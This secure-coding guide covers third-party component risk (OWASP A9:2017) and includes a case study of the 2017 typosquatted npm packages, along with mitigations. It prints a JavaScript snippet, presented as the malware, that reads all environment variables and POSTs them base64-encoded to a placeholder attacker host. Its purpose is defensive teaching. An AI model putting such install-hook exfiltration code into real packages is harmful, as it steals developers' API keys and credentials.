# Using Components with Known Vulnerabilities

# Description

When it comes to Third Party Management, [The OWASP Top 10 2017 A9:2017 Using Components with Known Vulnerabilities](https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities) covers this topic very well.

During the Software Development Life-cycle, it is very important to add some controls to not only document the libraries that are being used, but also to have an inventory of the versions and components that are used and where are they being used, so they are not out of date, vulnerable or deprecated.

According to the OWASP foundation, some of the risks of using third-party JavaScript code could involve:
* The loss of control over changes to the client application.
* The execution of arbitrary code on client systems.
* The disclosure or leakage of sensitive information to 3rd parties.

# Case study: Exfiltration of sensitive information via TypoSquatting 

Back in August 2017, a malicious NPM (Node Package Management) user/developer published several packages taking advantage of the so-called technique known as Typosquatting, and included malware exfiltrate environment variables and send them to a user-controlled domain (aka secret stealing).

## What is Typosquatting Anyway?
Doing some quick search on the Internet you come across the following definition from Wikipedia:

"Typosquatting, also called URL hijacking, a sting site, or a fake URL, is a form of cybersquatting, and possibly brandjacking which relies on mistakes such as typos made by Internet users when inputting a website address into a web browser. Should a user accidentally enter an incorrect website address, they may be led to any URL (including an alternative website owned by a cybersquatter).
The typosquatter's URL will usually be one of four kinds, all similar to the victim site address (e.g. example.com):
* A common misspelling, or foreign language spelling, of the intended site: exemple.com
* A misspelling based on typos: examlpe.com
* A differently phrased domain name: examples.com
* A different top-level domain: example.org
* An abuse of the Country Code Top-Level Domain (ccTLD): example.cm by using .cm, example.co by using .co, or example.om by using .om. A person leaving out a letter in .com in error could arrive at the fake URL's website.

Once in the typosquatter's site, the user may also be tricked into thinking that they are in fact in the real site, through the use of copied or similar logos, website layouts, or content. Spam emails sometimes make use of typosquatting URLs to trick users into visiting malicious sites that look like a given bank's site, for instance."

Note that the previous definition not only applies to domain names, it can be used to deceive the user with names or strings that look very similar to what the user is looking for.

# Code examples

In this real scenario, the attacker created several npm packages with a similar name (typosquatting) to the original package, but those packages published by the threat actor, contained additional code that exfiltrated secrets and environment variables during the installation hook in npm. The malware code looked like this:

```javascript
const http        = require('http');
const querystring = require('querystring');

const host        = 'malicious-domain-goes-here';
const env         = JSON.stringify(process.env);
const data        = new Buffer(env).toString('base64');

const postData    = querystring.stringify({data});

const options    = {
    hostname: host,
    port    : 80,
    path    : '/log/',
    method  : 'POST',
    headers : {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLenght(postData)
    }
}
const req = http.request(options)
req.write(portData);
req.end();
```
As you can see in this code, the threat actor added a post-installation script that accessed environment variables and pushed them to a controlled domain. Commonly, developers store sensitive data and secrets (API keys, cloud provider credentials, ssh keys) in environment variables; by installing this package without doing a proper code review, could introduce multiple problems.

# Mitigation

Here are some good recommendations for doing a proper patching process:

* Remove unused dependencies, unnecessary features, components, files, and documentation.
* Continuously inventory the versions of both client-side and server-side components (e.g. frameworks, libraries) and their dependencies using tools like versions, DependencyCheck, retire.js, etc. Continuously monitor sources like CVE and NVD for vulnerabilities in the components. Use software composition analysis tools to automate the process. Subscribe to email alerts for security vulnerabilities related to components you use.
* Only obtain components from official sources over secure links. Prefer signed packages to reduce the chance of including a modified, malicious component.
* Monitor for libraries and components that are unmaintained or do not create security patches for older versions. If patching is not possible, consider deploying a virtual patch to monitor, detect, or protect against the discovered issue.
Every organization must ensure that there is an ongoing plan for monitoring, triaging, and applying updates or configuration changes for the lifetime of the application or portfolio.

## Risk Assessment

Vulnerabilities on some known libraries could have a low impact low whereas others could cause a large breach. Depending on the assets being protected, the impact could be low or severe.

# References

[A9:2017-Using Components with Known Vulnerabilities](https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities)

[Third Party JavaScript Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Third_Party_Javascript_Management_Cheat_Sheet.html)

[corssenv malware on the npm registry](https://blog.npmjs.org/post/163723642530/crossenv-malware-on-the-npm-registry)

[Command and Scripting Interpreter: JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007/)
